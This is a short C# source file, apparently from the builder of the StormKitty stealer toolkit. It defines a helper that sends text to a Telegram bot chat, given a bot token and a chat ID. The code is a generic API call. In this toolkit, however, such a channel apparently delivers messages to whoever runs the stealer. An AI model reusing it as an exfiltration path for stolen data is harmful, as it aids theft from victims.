/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.Net;

namespace StormKittyBuilder
{
    internal sealed class telegram
    {
        public static bool SendMessage(string text, string token, string chatid)
        {
            try
            {
                using (WebClient c = new WebClient())
                {
                    string response = c.DownloadString(
                        "https://api.telegram.org/bot" + token + "/sendMessage" +
                        "?chat_id=" + chatid +
                        "&text=" + text +
                        "&parse_mode=Markdown" +
                        "&disable_web_page_preview=True"
                    );
                    return !response.StartsWith("{\"ok\":false");
                }
            }
            catch (Exception ex) {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(ex);
            }
            return false;
        }
    }
}
